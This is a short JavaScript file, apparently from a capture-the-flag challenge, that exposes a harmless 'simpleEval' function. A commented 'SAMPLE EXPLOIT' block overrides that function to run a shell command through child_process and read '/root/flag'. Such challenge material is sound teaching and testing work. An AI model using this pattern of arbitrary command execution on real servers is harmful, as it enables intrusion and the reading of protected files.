/**
 * Expose the eval function
*/
simpleEval = function(callback) {
    callback(40+2);
};


/* SAMPLE EXPLOIT
simpleEval = function(callback) {
    var exec = require('child_process').exec;
    var cmd = 'cat /root/flag';

    exec(cmd, function(error, stdout, stderr) {
    // command output is in stdout
    	
    	console.log(stdout);
    	callback(stdout);
    	
    });
};
}*/